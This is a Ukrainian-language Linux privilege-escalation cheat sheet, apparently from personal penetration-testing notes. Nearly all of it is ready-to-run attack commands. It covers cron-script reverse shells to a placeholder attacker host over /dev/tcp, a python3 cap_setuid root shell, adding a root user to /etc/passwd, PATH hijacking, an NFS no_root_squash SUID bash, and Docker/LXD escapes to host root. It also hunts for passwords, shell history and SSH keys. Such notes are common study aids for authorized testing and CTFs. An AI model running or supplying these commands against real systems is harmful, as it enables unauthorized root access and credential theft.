# Linux PrivEsc

## Автоматика
```bash
./linpeas.sh | tee linpeas.txt
./lse.sh -l 2          # Linux Smart Enumeration (альтернатива)
```

---

## sudo
```bash
sudo -l
# NOPASSWD → GTFOBins (https://gtfobins.github.io)
# приклад: sudo vim → :!/bin/bash
```

## SUID / SGID
```bash
find / -perm -4000 2>/dev/null    # SUID
find / -perm -2000 2>/dev/null    # SGID
# GTFOBins для кожного знайденого бінарника
```

## Capabilities
```bash
getcap -r / 2>/dev/null
# небезпечні: python3 cap_setuid, perl cap_setuid, openssl, tcpdump (cap_net_raw)
# python3 з cap_setuid:
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

## Cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
# Якщо cron запускає writable скрипт:
echo 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1' >> /path/to/script.sh
# Якщо змінна PATH у crontab вказує на writable директорію:
echo '#!/bin/bash\nbash -i >& /dev/tcp/<ATTACKER>/443 0>&1' > /tmp/fakebinary
chmod +x /tmp/fakebinary
```

## Writable /etc/passwd
```bash
# Якщо є запис:
echo 'hacker:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # пароль: pass123
```

## PATH Hijacking
```bash
# Якщо SUID-бінарник запускає команду без повного шляху:
strings /path/to/suid-binary | grep -v '/'   # знайди 'service', 'id' тощо
export PATH=/tmp:$PATH
echo '#!/bin/bash\nbash -p' > /tmp/service
chmod +x /tmp/service
/path/to/suid-binary
```

## NFS no_root_squash
```bash
# На атакері: перевір шари NFS:
showmount -e <target-IP>
# Якщо є no_root_squash:
mount -t nfs <target-IP>:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# На цілі:
/share/bash -p    # → root shell
```

## Docker / LXD Group
```bash
id  # якщо є "docker" або "lxd" в групах
# Docker escape:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# LXD escape (якщо немає alpine image — імпортуй через https):
lxc image import alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

## Пошук паролів у файлах
```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
# History файли:
cat ~/.bash_history
cat ~/.mysql_history
# SSH ключі:
find / -name "id_rsa" 2>/dev/null
```

## Слабкі дозволи на чутливі файли
```bash
ls -la /etc/shadow      # readable?
ls -la /root/           # accessible?
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
```

## Kernel Exploits (останній вибір)
```bash
uname -r
# searchsploit linux kernel <version>
# LES (Linux Exploit Suggester):
./les.sh
```

**Зв'язки:** GTFOBins · [[Credentials]] · [[Shells-Payloads]]
